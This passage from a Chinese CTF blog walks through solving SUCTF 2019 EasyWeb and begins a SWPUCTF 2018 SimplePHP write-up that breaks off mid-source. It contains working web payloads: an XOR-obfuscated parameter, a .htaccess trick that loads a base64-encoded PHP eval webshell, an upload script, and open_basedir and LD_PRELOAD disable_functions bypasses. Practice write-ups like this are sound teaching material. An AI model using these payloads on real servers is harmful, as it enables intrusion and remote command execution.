class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为还限制了字符类型，所以尽量用重复的字符。</p><blockquote><p>在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理，所以<code>$_GET[&#39;c&#39;]</code>等价于<code>$_GET&#123;&#39;c&#39;&#125;</code>，但这个问题7.4报warn，8.0可能会被处理。<img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717140140439.png" alt="image-20210717140140439"></p></blockquote><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token constant">_</span><span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">^</span><span class="token operator">%</span>df<span class="token operator">%</span>c7<span class="token operator">%</span>c5<span class="token operator">%</span>d4<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token number">80</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span><span class="token number">80</span><span class="token operator">=</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在buuctf上，这题其实已经结束了，后面还是很多值得学习的内容，所以继续往下写。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717134303368.png"></p><h4 id="最简情况的字符考量"><a href="#最简情况的字符考量" class="headerlink" title="最简情况的字符考量"></a>最简情况的字符考量</h4><p>经测试，在这种最简情况下，尽量用大于0x7f的字符进行异或，否则在urldecode的时候会造成错误。</p><p>例如：</p><p><code>%24^%7b</code>结果为<code>_</code>,但<code>%24</code>urldecode结果是<code>$</code>,就与payload里的<code>$</code>造成冲突。</p><p>如果加了引号，则不用担心这个问题。</p><h3 id="2-利用-htaccess文件上传"><a href="#2-利用-htaccess文件上传" class="headerlink" title="2.利用.htaccess文件上传"></a>2.利用.htaccess文件上传</h3><blockquote><p>.htaccess文件提供了针对目录改变配置的方法,在一个<strong>特定的文档目录</strong>中放置一个包含一个或多个指令的文件,以作用于<strong>此目录及其所有子目录</strong>。</p></blockquote><p>加了很多限制，所以是要利用<code>get_the_flag()</code>函数</p><p><code>exif_imagetype</code>第一反应肯定是图片马，所以考虑图片马构造，但<code>&lt;?</code>被限制，导致大部分一句话木马都被过滤了，而<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>又只能在php5环境下使用</p><p>所以将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码</p><h4 id="htaccess-文件头检测绕过"><a href="#htaccess-文件头检测绕过" class="headerlink" title=".htaccess+文件头检测绕过"></a>.htaccess+文件头检测绕过</h4><p>因为有<code>exif_imagetype</code>进行文件头检测，一般是加<code>GIF89a</code>进行绕过，但在这里会导致<code>.htaccess</code>文件无法正常生效，所以在<code>.htaccess</code>文件中加上</p><pre class="line-numbers language-none"><code class="language-none">#define width 1337#define height 1337<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是<code>.htaccess</code>文件内容如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#define width 1337</span><span class="token comment">#define height 1337</span>AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>aphp_value auto_append_file <span class="token string double-quoted-string">"php://filter/convert.base64-decode/resource=./shell.a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>shell.a</code>文件内容如下，多加了12是为了补足8个字节，满足base64编码的规则，<del>太细了</del></p><blockquote><p>base64编码要求:每三个字节/字符一组,也就是字符数是3的整数倍(因为是ascii码，所以一个字节等于一个字符)</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs<span class="token operator">/</span>Pg<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因为exif_imagetype是检测开头字符，所以注意GIF89a12前面不要有换行符，不要有空格，python三单引号形式字符串注意换行符。</p><p>上传脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">r"http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>htaccess_content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''#define width 1337#define height 1337AddType application/x-httpd-php .aphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"'''</span>files_htaccess <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    <span class="token string">'.htaccess'</span><span class="token punctuation">,</span> htaccess_content<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>res_hta <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files_htaccess<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res_hta<span class="token punctuation">.</span>text<span class="token punctuation">)</span>shell_file <span class="token operator">=</span> <span class="token string">'GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='</span>files_shell <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    <span class="token string">'shell.a'</span><span class="token punctuation">,</span> shell_file<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>res_jpg <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files_shell<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res_jpg<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-open-basedir-bypass"><a href="#3-1-open-basedir-bypass" class="headerlink" title="3-1.open_basedir bypass"></a>3-1.open_basedir bypass</h3><p>蚁剑连接后，没法访问其他目录。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717155100137.png"></p><p><a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a></p><p>payload：</p><p>扫目录</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">cmd<span class="token operator">=</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717160428022.png"></p><p>flag在<code>THis_Is_tHe_F14g</code></p><p>读取文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/THis_Is_tHe_F14g'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717160615093.png"></p><h3 id="3-2-disable-function-bypass"><a href="#3-2-disable-function-bypass" class="headerlink" title="3-2.disable_function bypass"></a>3-2.disable_function bypass</h3><p>原理可见<a href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></p><p>但这题<img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717194223861.png"></p><p>由于禁用了mail，所以得考虑其他函数，比如<code>error_log</code>，<code>mb_send_mail</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p> &lt;b>example&lt;/b>: bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so &lt;/p>"</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$out_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"outpath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$evil_cmdline</span> <span class="token operator">=</span> <span class="token variable">$cmd</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" > "</span> <span class="token operator">.</span> <span class="token variable">$out_path</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" 2>&amp;1"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p> &lt;b>cmdline&lt;/b>: "</span> <span class="token operator">.</span> <span class="token variable">$evil_cmdline</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"EVIL_CMDLINE="</span> <span class="token operator">.</span> <span class="token variable">$evil_cmdline</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$so_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"sopath"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"LD_PRELOAD="</span> <span class="token operator">.</span> <span class="token variable">$so_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//以下三个可以一起放着，函数被禁用也不需要注释，不影响</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mb_send_mail</span><span class="token punctuation">(</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//以下两个没有则需要注释掉，否则无法正常执行</span><span class="token comment">// $img = Imagick("1.mp4"); //如果有ImageMagick这个扩展(文件必须存在)</span><span class="token comment">// imap_mail("", "", ""); //需要安装imap拓展</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p> &lt;b>output&lt;/b>: &lt;br />"</span> <span class="token operator">.</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$out_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717194518630.png"></p><p>成功。单单这个PHP的话，似乎不能用蚁剑连接。</p><h3 id="3-3-利用蚁剑一键bypass！"><a href="#3-3-利用蚁剑一键bypass！" class="headerlink" title="3-3.利用蚁剑一键bypass！"></a>3-3.利用蚁剑一键bypass！</h3><p>蚁剑nb！<del>破音</del></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-SUCTF-2019-EasyWeb/image-20210717195728573.png"></p><p>然后连接<code>/.antproxy.php</code>，还能再用蚁剑连，蚁剑nb！</p><p>结束。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://my.oschina.net/u/4328601/blog/3401784">https://my.oschina.net/u/4328601/blog/3401784</a></p><p><a href="https://blog.csdn.net/qq_42967398/article/details/105615235">https://blog.csdn.net/qq_42967398/article/details/105615235</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> disable_functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SWPUCTF 2018]SimplePHP</title>
      <link href="/p/1119933272.html"/>
      <url>/p/1119933272.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[phar|pop|上传]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163355954.png" alt="image-20210710163355954"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>F12有惊喜</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163417170.png" alt="image-20210710163417170"></p><p><code>file.php?file=</code>可以看到各个php界面源码</p><h3 id="文件源码"><a href="#文件源码" class="headerlink" title="文件源码"></a>文件源码</h3><ul><li><p>file.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'function.php'</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>function.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">222.90.67.205<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//show_source(__FILE__);</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"base.php"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>    <span class="token comment">//mkdir("upload",0777);</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("上传成功!");&lt;/script>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>    <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//echo "&lt;h4>请选择上传的文件:" . "&lt;h4/>";</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script type="text/javascript">alert("Invalid file!");&lt;/script>'</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token 